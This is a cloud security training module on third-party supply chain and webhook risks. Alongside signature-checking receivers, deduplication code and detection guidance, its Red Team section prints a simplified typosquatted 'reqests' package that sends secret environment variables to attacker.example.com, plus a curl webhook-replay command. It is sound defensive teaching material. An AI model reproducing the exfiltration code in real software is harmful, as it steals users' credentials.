# 09 — Supply Chain and Third-Party Integrations

> **Level:** Intermediate
> **Prereqs:** `../Compute-Container-Security/ami-image-vuln-and-supply-chain.md`, `queue-topic-and-messaging-abuse.md`
> **Clouds:** AWS · Azure · GCP · OnPrem
> **MITRE ATT&CK (tactics):** Initial Access, Persistence, Execution
> **Authorization scope:** Audit your own application's dependencies and webhook endpoints only. Do not scan or test third-party services without permission.

## What & why

Cloud-native apps integrate with third-party services via outbound HTTPS + signed webhooks in both directions. Each dependency (NPM, pip, container base image) and each third-party API key is a trust boundary. A single typosquatted package or misvalidated webhook signature can give an attacker a foothold inside your application's cloud context.

## The OnPrem reality

SOAP-based integrations over ESBs (Enterprise Service Bus), with X.509 mutual auth and XML signature validation. Supply chain meant managing JAR files in Artifactory. The surface was smaller (fewer external SaaS integrations) but the blast radius of a compromised ESB was enormous — every connected application.

## Core concepts

### Two attack directions

```
┌──────────────┐                    ┌──────────────┐
│  Your App    │ ── outbound (API)──▶│ Third-Party  │  ← Your app calls Stripe/Twilio/GitHub
│  (cloud)     │                    │  Service     │     API key stored in Secrets Manager
└──────────────┘                    └──────────────┘
       ▲
       │ inbound (webhook)
       │
┌──────────────┐
│ Third-Party  │  ← GitHub sends webhook to your app
│  Service     │     Your app must validate HMAC signature
└──────────────┘
```

### Risk matrix

| Direction | Risk | Example |
|---|---|---|
| Outbound (your app → 3P) | API key leaked → attacker calls 3P as you, incurring cost or exfiltrating data | Stolen Stripe key → refund all transactions |
| Outbound (your app → 3P) | Malicious 3P dependency typosquat | `pip install reqests` instead of `requests` → key exfiltrated |
| Inbound (3P → your app) | Webhook without signature validation → attacker crafts fake webhook | Fake GitHub push event → CI/CD pipeline triggered |
| Inbound (3P → your app) | Webhook replay → attacker replays valid signed webhook | Replay a `payment.success` webhook → double credit |

### Per-cloud secret storage for outbound 3P keys

| Cloud | Service | Code to retrieve |
|---|---|---|
| AWS | Secrets Manager | `boto3.client('secretsmanager').get_secret_value(SecretId='stripe-api-key')` |
| Azure | Key Vault | `SecretClient(vault_url, credential).get_secret('stripe-api-key')` |
| GCP | Secret Manager | `client.access_secret_version(request={"name": "projects/*/secrets/stripe-api-key/versions/latest"})` |
| OnPrem | HashiCorp Vault | `vault_client.secrets.kv.v2.read_secret_version(path='stripe-api-key')` |

### Webhook signing schemes

| Provider | Signature scheme | Verification |
|---|---|---|
| GitHub | HMAC-SHA256: `sha256=<hex>` in `X-Hub-Signature-256` | Constant-time compare of HMAC computed with webhook secret |
| Stripe | HMAC-SHA256: `t=<timestamp>,v1=<sig>` in `Stripe-Signature` | Same, with timestamp tolerance check |
| Slack | HMAC-SHA256: `v0=<sig>` in `X-Slack-Signature` | Constant-time compare with signing secret |
| Twilio | HMAC-SHA256: `X-Twilio-Signature` using auth token | Compare against full URL + sorted params |
| Generic JWTs | `Authorization: Bearer <JWT>` with `iss` claim | JWT validation (iss, aud, exp, signature) |

## AWS

### Webhook receiver validating GitHub signature

```python
import hmac
import hashlib
import os

from flask import Flask, request

app = Flask(__name__)
WEBHOOK_SECRET = os.environ['GITHUB_WEBHOOK_SECRET'].encode()  # from Secrets Manager

@app.route('/webhooks/github', methods=['POST'])
def github_webhook():
    signature = request.headers.get('X-Hub-Signature-256', '')
    if not signature.startswith('sha256='):
        return 'Missing signature', 401

    # Compute expected signature
    payload = request.get_data()
    expected = 'sha256=' + hmac.new(WEBHOOK_SECRET, payload, hashlib.sha256).hexdigest()

    # Constant-time comparison to prevent timing attacks
    if not hmac.compare_digest(signature, expected):
        return 'Invalid signature', 401

    event_type = request.headers.get('X-GitHub-Event')
    data = request.get_json()

    # Whitelist allowed event types
    ALLOWED_EVENTS = {'push', 'release', 'deployment'}
    if event_type not in ALLOWED_EVENTS:
        return f'Event type {event_type} not allowed', 400

    process_github_event(event_type, data)
    return 'OK', 200
```

### Storing the webhook secret in Secrets Manager (IaC)

```hcl
# Terraform — AWS
resource "aws_secretsmanager_secret" "github_webhook" {
  name = "github-webhook-secret"
}

resource "aws_secretsmanager_secret_version" "github_webhook" {
  secret_id     = aws_secretsmanager_secret.github_webhook.id
  secret_string = random_password.webhook_secret.result
}

resource "random_password" "webhook_secret" {
  length  = 32
  special = true
}
```

## Azure

### Webhook receiver (Azure Functions)

```python
import hmac
import hashlib
import os
import azure.functions as func

from azure.identity import DefaultAzureCredential
from azure.keyvault.secrets import SecretClient

# Retrieve webhook secret from Key Vault at cold start
vault_url = "https://app-kv.vault.azure.net/"
credential = DefaultAzureCredential()
secret_client = SecretClient(vault_url=vault_url, credential=credential)
WEBHOOK_SECRET = secret_client.get_secret("github-webhook-secret").value.encode()

def main(req: func.HttpRequest) -> func.HttpResponse:
    signature = req.headers.get('X-Hub-Signature-256', '')
    if not signature.startswith('sha256='):
        return func.HttpResponse('Missing signature', status_code=401)

    payload = req.get_body()
    expected = 'sha256=' + hmac.new(WEBHOOK_SECRET, payload, hashlib.sha256).hexdigest()

    if not hmac.compare_digest(signature, expected):
        return func.HttpResponse('Invalid signature', status_code=401)

    event_type = req.headers.get('X-GitHub-Event')
    ALLOWED_EVENTS = {'push', 'release'}
    if event_type not in ALLOWED_EVENTS:
        return func.HttpResponse(f'Event {event_type} not allowed', status_code=400)

    process_event(event_type, req.get_json())
    return func.HttpResponse('OK', status_code=200)
```

## GCP

### Webhook receiver (Cloud Run)

```python
import hmac
import hashlib
import os

from flask import Flask, request
from google.cloud import secretmanager

app = Flask(__name__)

def get_webhook_secret():
    client = secretmanager.SecretManagerServiceClient()
    name = "projects/example-project/secrets/github-webhook-secret/versions/latest"
    response = client.access_secret_version(request={"name": name})
    return response.payload.data

WEBHOOK_SECRET = get_webhook_secret()

@app.route('/webhooks/github', methods=['POST'])
def github_webhook():
    signature = request.headers.get('X-Hub-Signature-256', '')
    if not signature.startswith('sha256='):
        return 'Missing signature', 401

    payload = request.get_data()
    expected = 'sha256=' + hmac.new(WEBHOOK_SECRET, payload, hashlib.sha256).hexdigest()

    if not hmac.compare_digest(signature, expected):
        return 'Invalid signature', 401

    event_type = request.headers.get('X-GitHub-Event')
    ALLOWED_EVENTS = {'push', 'release', 'deployment'}
    if event_type not in ALLOWED_EVENTS:
        return f'Event {event_type} not allowed', 400

    data = request.get_json()
    process_github_event(event_type, data)
    return 'OK', 200
```

## OnPrem mapping (recap table)

| Concern | OnPrem | AWS | Azure | GCP |
|---|---|---|---|---|
| 3P API key storage | Vault KV secrets engine | Secrets Manager | Key Vault | Secret Manager |
| Webhook signature validation | Same HMAC logic (framework-level) | Same — in Lambda | Same — in Functions | Same — in Cloud Run |
| Signature scheme support | All (HMAC/JWT) | All (HMAC/JWT) | All (HMAC/JWT) | All (HMAC/JWT) |
| Inbound webhook routing | NGINX → backend | API Gateway → Lambda / EventBridge | APIM → Function / Event Grid | API Gateway / Cloud Endpoints → Cloud Run |
| Webhook replay protection | Timestamp + nonce cache (Redis) | EventBridge archive + replay | Event Grid `eventTime` + idempotency | Pub/Sub `publishTime` + idempotency |

## 🔴 Red Team view

### Attack 1: Typosquatting a dependency

**Scenario:** A developer's `requirements.txt` has a typo:

```
# requirements.txt
flask==3.0.0
reqests==2.31.0    # TYPO: should be "requests"
stripe==7.0.0
```

The package `reqests` on PyPI is a typosquatted clone. It imports the real `requests` and proxies all calls, but also exfiltrates environment variables to `https://attacker.example.com/collect`:

```python
# Inside the malicious 'reqests' package (simplified for illustration)
import os
import requests as _real_requests

def _exfiltrate():
    try:
        env_data = {k: v for k, v in os.environ.items()
                    if any(secret in k.lower() for secret in ['key', 'secret', 'token', 'password'])}
        _real_requests.post('https://attacker.example.com/collect', json=env_data, timeout=2)
    except:
        pass  # silently fail

# Patch the real requests module
original_get = _real_requests.get

def patched_get(*args, **kwargs):
    _exfiltrate()
    return original_get(*args, **kwargs)

_real_requests.get = patched_get
```

**Impact in cloud:**
- `STRIPE_API_KEY` from environment variable → attacker processes refunds.
- `AWS_ACCESS_KEY_ID` + `AWS_SECRET_ACCESS_KEY` from Lambda env → attacker enumerates account.
- `DATABASE_URL` → attacker connects to managed DB.

### Attack 2: Webhook replay

**Scenario:** The app validates GitHub's HMAC signature but does not check the `X-GitHub-Delivery` GUID for deduplication. Attacker captures a valid `push` webhook (e.g., from a logged response) and replays it:

```bash
# Attacker replays a captured valid payload
curl -X POST https://api.example.com/webhooks/github \
  -H "Content-Type: application/json" \
  -H "X-Hub-Signature-256: sha256=<captured-valid-signature>" \
  -H "X-GitHub-Event: push" \
  -H "X-GitHub-Delivery: a1b2c3d4-0000-0000-0000-000000000000" \
  -d '<captured-payload>'
```

If no deduplication exists, the CI/CD pipeline triggers again — deploying code, running tests, or provisioning infrastructure.

**Containment:** Store processed `X-GitHub-Delivery` GUIDs in a cache (Redis/DynamoDB) with TTL. Reject duplicates.

### Attack 3: Unvalidated 3P URL in app configuration

```yaml
# terraform.tfvars — VULNERABLE
webhook_target_url = "https://third-party-saas.example.com/callback"

# The third-party SaaS is taken over (domain expired, or it's a demo account).
# Attacker now controls https://third-party-saas.example.com/callback
# Attacker receives all webhook payloads (including JWT auth tokens, user data)
```

**Containment:** Validate outbound URLs at config time. Pin TLS certificate pins for critical 3P endpoints.

### Artifacts:
- Outbound network connections to unknown IPs (dependency exfiltration).
- Duplicate `X-GitHub-Delivery` GUIDs in application logs.
- Unusual secrets access patterns (spike in `secretsmanager:GetSecretValue`).
- New/unexpected DNS resolutions (typosquatted domain resolution).

## 🔵 Blue Team view

### Prevention

| Control | AWS | Azure | GCP | OnPrem |
|---|---|---|---|---|
| Dependency scanning | Dependabot / Snyk / Inspector / OSV | Dependabot (GitHub) / Microsoft Defender for DevOps | Artifact Registry vulnerability scanning / OSV | `pip-audit` / `npm audit` / OWASP Dependency-Check |
| Pin + hashes | `pip install --require-hashes -r requirements.txt` | Same | Same | Same |
| Lockfile review | CODEOWNERS review on `package-lock.json`, `Pipfile.lock` | Same | Same | Same |
| Webhook signature validation | HMAC constant-time compare + event type allowlist | Same + timestamp check | Same + timestamp check | Same |
| Webhook replay prevention | Cache delivery GUID (DynamoDB TTL) | Cache delivery GUID (Redis/Cosmos) | Cache delivery GUID (Memorystore) | Redis GUID cache |
| Outbound URL allowlist | VPC endpoint firewall / AWS Network Firewall domain allowlist | NSG service tags / Azure Firewall FQDN rules | VPC firewall rules / Cloud NAT domain filtering | Squid proxy allowlist |
| SBOM generation | `syft` / `cyclonedx-python` during build | Same | Same | Same |

### Dependency supply chain hardening

```bash
# Python: Pin with hashes
pip-compile --generate-hashes requirements.in -o requirements.txt
pip install --require-hashes -r requirements.txt

# Node.js: Use npm ci with lockfile (strict)
npm ci --audit=false  # audit separately
npm audit --production

# Container: Pin base image by SHA256 digest
# Dockerfile
FROM python:3.11-slim@sha256:abc123def456789...
```

### Webhook deduplication pattern

```python
import hashlib
import time
import redis

redis_client = redis.Redis(host='dedup-cache.internal', port=6379)

def check_and_record_delivery(delivery_id, ttl=3600):
    key = f'webhook:delivery:{delivery_id}'
    # SET NX — returns True only if key doesn't exist
    if redis_client.set(key, '1', nx=True, ex=ttl):
        return True  # First time seeing this delivery — process
    return False  # Duplicate — reject

@app.route('/webhooks/github', methods=['POST'])
def github_webhook():
    # ... HMAC validation (as above) ...

    delivery_id = request.headers.get('X-GitHub-Delivery')
    if not delivery_id:
        return 'Missing delivery ID', 400

    if not check_and_record_delivery(delivery_id):
        return 'Duplicate delivery', 409

    # Process event...
```

### Detection

| Signal | Source | Query |
|---|---|---|
| New dependency added without review | Git log / CI pipeline | PR adding/editing `requirements.txt`/`package.json` without CODEOWNERS approval |
| Outbound connection to unknown domain | VPC Flow Logs / DNS logs | `dstAddr NOT IN (allowlist) AND dstPort == 443` from app subnet |
| Duplicate webhook delivery | Application logs | Count of `409 Duplicate delivery` responses per source IP |
| Secret accessed at unusual time | CloudTrail / Activity Log | `secretsmanager:GetSecretValue` spike correlates with new deployment |
| Unrecognized caller to webhook endpoint | CloudTrail / API Gateway logs | Webhook endpoint hit from IP not in GitHub/Stripe published IP ranges |

**AWS CloudTrail — secrets manager access anomaly:**

```sql
SELECT eventTime, eventName, userIdentity.arn, sourceIPAddress
FROM cloudtrail_logs
WHERE eventName = 'GetSecretValue'
  AND eventSource = 'secretsmanager.amazonaws.com'
  AND userIdentity.arn LIKE '%:role/AppLambda-Role'
  AND eventTime >= date_add('hour', -1, current_timestamp)
ORDER BY eventTime DESC
-- Alert if: >20 GetSecretValue calls in 1 minute (exfiltration pattern)
```

### CI/CD pipeline check (GitHub Actions example)

```yaml
# .github/workflows/dependency-check.yml
name: Dependency Audit
on:
  pull_request:
    paths:
      - 'requirements.txt'
      - 'package.json'
      - 'package-lock.json'

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Python dependency audit
        run: |
          pip install pip-audit
          pip-audit -r requirements.txt

      - name: NPM audit
        run: npm audit --production --audit-level=high

      - name: Check for typosquatting
        run: |
          # Compare installed packages against PyPI top 1000 for typos
          pip list --format=freeze | python3 scripts/detect-typosquat.py
```

### Response steps

1. **Revoke and rotate** the compromised API key immediately (use automated key rotation if available).
2. **Purge the malicious dependency** from lockfile and rebuild from clean base.
3. **Audit webhook logs** for all deliveries from the compromise window — identify data exfiltrated.
4. **Block the exfiltration domain** at network firewall level.
5. **Report the malicious package** to PyPI/npm security and the cloud provider's abuse team.

## Hands-on lab

1. Set up a Flask webhook receiver on localhost that validates GitHub HMAC signatures.
2. Send a valid webhook using the GitHub webhook simulator or a local `curl` with correct HMAC.
3. Send an invalid signature — confirm rejection.
4. Send a replayed delivery GUID — confirm deduplication rejects it.
5. Run `pip-audit` on your app's `requirements.txt` and fix any flagged vulnerabilities.

## References

- OWASP Top 10 — A06:2021 Vulnerable and Outdated Components: https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/
- SLSA framework (Supply-chain Levels for Software Artifacts): https://slsa.dev/
- GitHub webhook securing: https://docs.github.com/en/webhooks/using-webhooks/securing-your-webhooks
- Stripe webhook signature verification: https://stripe.com/docs/webhooks/signatures
- Cross-ref: `../Compute-Container-Security/ami-image-vuln-and-supply-chain.md` for container/image supply chain.
- Cross-ref: `../Secrets-KMS/git-and-cicd-leakage-paths.md` for CI/CD secret leakage.
- Cross-ref: `queue-topic-and-messaging-abuse.md` for event-driven trust boundaries.
